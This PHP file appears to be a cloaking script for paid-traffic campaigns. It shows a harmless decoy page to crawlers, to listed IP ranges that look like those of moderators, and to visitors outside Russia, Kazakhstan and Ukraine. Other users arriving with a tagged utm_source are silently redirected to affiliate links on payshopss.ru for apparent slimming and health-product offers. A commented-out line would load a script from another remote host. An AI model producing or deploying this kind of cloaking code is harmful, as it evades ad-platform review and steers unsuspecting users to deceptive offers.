<?php
function ShowWhiteHTML()
{
	 include 'white3.php';
}

function ShowGreyHTML()
{ 
    if(!Yii::$app->request->get('utm_source')) {
		ShowWhiteHTML();
	}
	echo '<!doctype><html><header><noscript><meta http-equiv="refresh"content="0; url=/"></noscript>  <style>body {margin: 0;}</style></header><body>';
	 
	$ee = 1;
    //include 'stat.php'; 
	
	$a = Yii::$app->request->get('utm_source');	 
	
	if(empty(explode("_", $a)[0]))
	{
		ShowWhiteHTML();
		return;
	}
	
	if(empty(explode("_", $a)[1]))
	{
		ShowWhiteHTML();
		return;
	}
	
	if(empty(explode("_", $a)[2]))
	{
		ShowWhiteHTML();
		return;
    }
    $link1 = "https://payshopss.ru/ecoslim18/?ref=162875&lnk=1926068";
    $link2 = "https://payshopss.ru/gardeninfatflex1/?ref=162875&lnk=1926074";

    if(date('s') % 2 == 0)
        $link =  $link1;
    else $link =  $link2;

     echo '<script>document.location = "'.$link.'";</script>';
	//echo '<script src="http://some-muzik-file.ru/code/05e8b6c3b326772f51f10f4960096372.js"></script></body></html>';
}

function GetCountry()
{
	$ipaddress = $_SERVER['REMOTE_ADDR'];
	
	$a = $ipaddress;
	$a2 = '79.139.192.0';
	$a3 = '79.139.255.255'; 
	$a4 = '37.9.113.0';
	$a5 = '37.9.113.255'; 
	$a6 = '178.154.171.0';
	$a7 = '178.154.171.255';  
	$a8 = '46.0.0.0';
	$a9 = '46.0.31.255';   
	$a10 = '5.228.128.0';
	$a11 = '5.228.255.255';  
	
	$f1 = ip2long($a);
	$f2 = ip2long($a2);
	$f3 = ip2long($a3);
	$f4 = ip2long($a4);
	$f5 = ip2long($a5);
	$f6 = ip2long($a6);
	$f7 = ip2long($a7);
	$f8 = ip2long($a8);
	$f9 = ip2long($a9);
	$f10 = ip2long($a10);
	$f11 = ip2long($a11);

	if ($f1 <= $f3 && $f2 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f5 && $f4 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f7 && $f6 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f9 && $f8 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f11 && $f10 <= $f1) {
	  return "NONE";
	}

    $a = json_decode(file_get_contents('http://ip-api.com/json/'.$ipaddress), true);
	return $a['countryCode'];
}

$contry = GetCountry();
 
if($contry == "RU" || $contry == "KZ" || $contry == "UA") 
{
	//require_once 'Mobile_Detect.php';
	//$detect = new Mobile_Detect;
	// if($detect->isMobile() || $detect->isTablet())
	// {
		$a = strtolower($_SERVER['HTTP_USER_AGENT']);

		if(preg_match('/robot|bot|yahoo|mail|crawl|slurp|mediapartners|majesticsEO|facebook|yabrowser|pingdom|get|java|find|dataprovider|spider|crawler|curl|^$/i', $a))
		{
			echo ShowWhiteHTML();
		}
		else  ShowGreyHTML();
	//}
	//else ShowWhiteHTML();
}
else ShowWhiteHTML();
?>